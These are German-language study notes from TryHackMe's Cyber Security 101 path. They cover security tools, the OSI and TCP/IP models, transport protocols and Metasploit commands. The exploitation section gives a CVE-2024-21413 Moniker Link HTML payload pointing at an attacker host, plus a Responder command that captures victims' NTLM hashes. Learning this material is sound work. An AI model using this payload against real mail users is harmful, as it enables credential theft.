# Cyber Security 101
Diese Datei enthält die Informationen und Erkenntnisse aus dem _Cyber Security 101_-Path von TryHackMe.
## Schnellreferenz
- [Security Intro](#security-intro)
- [Networking](#networking)
- [Exploitation Basics](#exploitation-basics)

## Security Intro

_SOC_ steht für Security Operations Center. Dies ist ein Team von IT Security Professionals, welche Die Aufgabe haben, Threats zu  monitoren, verhindern , erkennen , untersuchen, und darauf zu reagieren.<br>
_Threat Intelligence_ steht für das Teilen von Informationen über Angreifer.

### Tools
_Shodan_ ist eine Suchmaschine für IoT-Geräte bzw. für alles, was öffentlich mit Internet läuft. Mit dieser Suchmaschine kann nach Devices mit bestimmten Eigenschaften gesucht werden. Dafür kann nach country, port, org, hostname uvm.  gefiltert werden.<br>
_VirusTotal_ nutzt mehr als 70 Antiviren-Engines & Website Scanners, mit denen man Dateien, URL, Domänen oder File Hashes scannen kann.<br>
_CVE_ steht für _Common Vulnerabilities and Exposures_ und ist quasi ein Nachschlagewerk bekannter Schwachstellen. Eine CVE besteht aus Name (CVE-YEAR-NUMBER) und CVSS Score (gibt Impact, Complexity & Availability an, um das Risk Level zu bestimmen). Diese Informationen sind in der _ExploitDB_ angegeben, auch bei Proof of Concepts (PoCs).



## Networking
### OSI Modell


| Layer Number | Layer Name | Main Function | Example Protocols and Standards |
|---|---|---|---|
| 7 | Application layer | Providing services and interfaces to applications | HTTP, FTP, DNS, POP3, SMTP, IMAP |
| 6 | Presentation layer | Data encoding, encryption, and compression | Unicode, MIME, JPEG, PNG, MPEG |
| 5 | Session layer | Establishing, maintaining, and synchronising sessions | NFS, RPC |
| 4 | Transport layer | End-to-end communication and data segmentation | UDP, TCP |
| 3 | Network layer | Logical addressing and routing between networks | IP, ICMP, IPSec |
| 2 | Data link layer | Reliable data transfer between adjacent nodes | Ethernet (802.3), Wi-Fi (802.11) |
| 1 | Physical layer | Physical data transmission media | Electrical, optical, and wireless signals |


### TCP/IP Modell
| TCP/IP Model  | ISO OSI Layers Covered | Protocols |
|---|---|---|
| Application Layer | 7 Application, 6 Presentation, 5 Session | HTTP, HTTPS, FTP, POP3, SMTP, IMAP, Telnet, SSH |
| Transport Layer | 4 Transport | TCP, UDP |
| Internet Layer | 3 Network | IP, ICMP, IPSec |
| Link Layer | 2 Data Link | Ethernet 802.3, Wi-Fi 802.11 |
(Physical) | (1 Physical)

### IP Adresse
.0 ist die Netzwerkadresse<br>
.255 ist die Broadcastadresse <br>
Ein Subnetz ist eine Unterteilung des Netzwerkes<br> 

Befehle, um die dem Gerät zugewiesene IP-Adresse zu ermitteln:
`ipconfig`,  `ifconfig` oder  `ip address show` bzw `ip a s`

Private IP-Bereiche: _10.0.0.0 - 10.255.255.255 (10/8), 172.16.0.0 - 172.31.255.255 (172.16/12)_ und _192.168.0.0 - 192.168.255.255 (192.168/16)_

### Transportprotokolle
_UDP_ steht für User Datagram Protocol. Dies ist ein verbindungsloses Protokoll auf Transportschicht, wobei  verbindungslos heißt, dass es keine Verbindung aufbauen muss, weshalb es nicht weiß, ob die übertragenene Daten angekommen sind. Dadurch ist die Übertragung jedoch auch schneller. Für UDP ist die Portnummer nötig, welche eine Nummer bestehend aus 16 Bits ist.

_TCP_ steht für Transmition Control Protocol und ist ein verbindungsorientiertes Transport Protokoll. Somit stellt es sicher, dass die übertragenen Daten angekommen sind. Für diesen Zweck haben die Daten eine Sequenznummer. Für den Verbindungsaufbau wird der 3-Way Handshake verwendet, bestehend aus SYN, SYN-ACK und ACK. Auch dieses Protokoll nutzt eine Portnummer.


Encapsulation bedeutet in diesem Kontext, dass die zu übertragenden Daten je Schicht Header (& teilweise Trailer) hinzugefügt bekommen, wie folgende Darstellung veranschaulicht.
1.									    					          Application Data
2.								    		      TCP/UDP Header	| Application Data
3. 							        IP Header 	| TCP/UDP Header	| Application Data
4.      Eathernet/Wi-Fi Header	|   IP Header 	| TCP/UDP Header	| Application Data	| Ethernet/Wi-Fi Trailer

_Application data_ sind die Daten, die der Nutzer eingibt, um sie mit der Anwendung zu senden. Die Anwendung formatiert diese Daten und fängt an die Daten konform mit dem genutzten Applikationsprotokoll zu senden, mittels des Transportlayers.<br>
_Transport protocol segment bzw. datagram_: Das Transportlayer fügt die entsprechenden Header Infromationen hinzu und erzeugt das TCP Segment bzw. das UDP Datagram. Dies wird dann an das Networklayer gesendet.<br>
_Network packet_: Das Networklayer fügt einen IP Header vor das TCP Segment bzw UDP Datagram ein und sendet es danach an das Data-Link-Layer.<br>
_Data link frame_: Das Ethernet oder das Wi-Fi empfängt das IP Paket und fügt den entsprechenden Header und Trailer an, welche einen Rahmen bilden.

_Telnet_ steht für Teletype Network Protocol und ist ein Protokoll für Remote Terminal Connection. Bei diesem Protokoll werden alle Daten in Klartext versendet, nicht wie bei SSH verschlüsselt.

## Exploitation Basics

### Moniker Link
_Moniker Links_ sind Links, welche spezielle Anwendungen öffnen<br>
im Normalfall kommt bei Outlook beim Öffnen eines Moniker Links eine Sicherheitswarnung (Protected View)<br>
CVE-2024-21413 umgeht dies jedoch

#### Vorgehen
in einer Mail ist folgender Code:
`<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>`<br>
der Exploit funktioniert mittels des `!`, wodurch die Protected View umgangen wird und das File versucht wird zu laden <br> 
der Angreifer startet den Befehl `responder -I ens5` und wartet, dass das Victim den Link klickt. Wenn das Victim den Link geklickt hat, erhält der Angreifer den netNTLMv2 Hash<br>

### Metasploit
Metasploit ist ein Exploitation Framework<br>
es gibt zwei Metasploit Versionen, Pro & Framework<br>

#### Hauptkomponenten
1. _msfconsole_ ist die Kommandozeile
2. _Modules_ sind unterstützende Module wie Exploits, Scanner, Payloads<br>
3. _Tools_ sind Standalone-Tools

#### Begriffe
Ein _Exploit_ ist ein Codestück, dass eine Vulnerability auf Zielsystem ist<br>
Eine _Vulnerability_ ist ein Design-, Code- oder logischer Fehler, welcher das Zielsystem beeinflusst. Durch Ausnutzen der Vulnerability können vertrauliche Informationen Preis gegeben werden oder Code-Ausführung für den Angreifer auf dem Zielsystem ermöglicht werden<br>
Eine _Payload_ bedeutet, dass ein Exploit eine Vulnerability ausnutzt. Damit das gewünschte Ergebnis erzielt werden kann, ist die Payload nötig. Somit ist eine Payload Code, der auf Zielsystem ausgeführt wird.<br>

#### Module
1. _Auxiliary_ sind unterstützende Module
2. _Encoders_ encoden Exploit & Payload, damit Virenscanner die Signaturen nicht erkennen
3. _Evasion_ sind für direktes Umgehen von Virenscannern
4. _Exploits_ sind Exploits, die nach Zielsystemen organsiert sind
5. _NOPs_ <b>No OP</b>eration sind Buffer, um die Payload Size bewusst zu steuern
6. _Payloads_ s.o.; Payloads werden unterteilt in _adapters_ (wrapped Payload in verschiedene Formate), _Singles_ (sind self-contained Payloads), _Stagers_ (stellen Verbindung zwische Metasploit & Zielsystem her) und _Stages_ (werden von Stager runtergeladen und sind für größere Payloads)
7. _POST_ sind für post-Exploitation

#### wichtige Informationen
Auf msfconsole sind keine Output redirects möglich<br>
`show` + entsprechender MODULE-Type zeigt verfügbare Module in dem Bereich<br>
Module auswählen via `use PATH/2/EXPLOIT`<br>
Kontext verlassen via `back`<br>
innerhalb Module mehr Kontext erfahren via `info` oder `info /PATH/2EXPLOIT`<br>
`search SUCHBEGRIFF` sucht in Metasploit Framework DB nach SUCHBEGRIFF<br>
search-Parameter: `search type TYP SUCHBEGRIFF` beschränkt die Suche nach SUCHBEGRIFF auf Begriffe mit dem entsprechenden Typ TYP, z.B. Auxiliary<br>
`show options` zeigt Options für das konkrete Modul an<br>
_meterpreter_ ist eine wichtige Payload und hat eine eigene Commandline<br>
_RHOST_ steht für remote Host und ist die IP des Zielsystems<br>
_RPORT_ steht für remote Port und ist der Port für die Vulnerability auf dem Zielsystem<br>
_LHOST_ steht für Localhost und ist die IP des Angreifers<br>
_LPORT_ steht für local Port und ist der Port beim Angreifer für die Connection zum Ziel<br>
_SESSION_ steht für Session-ID und ist für post-Exploitation zum re-connecten<br>
`unset all` setzt alle gesetzten Parameter zurück, `unset` setzt einzelne zurück<br>
`setg` setzt Werte globale für alle Module<br>
`nsetg` löscht alle Werte, auch global<br>

ein Modul kann man  via "exploit" oder "run" ausführen<br>
`exploit -z` startet die Ausführung im Hintergrund<br>
manche Module unterstützen `check`. Dies dient zum Prüfen, ob das Zielsystem unsicher ist, ohne es direkt anzugreifen<br>
`background` wird verwendet, um aus anderen Kontexten (z.B. meterpreter) zurück zu _msfconsole_ ODER Strg+Z<br>
`sessions` zeigt alle aktuellen Sessions an<br>
`session -i SESSIONID` zum fortsetzen der Session mit der Id SESSIONID<br>
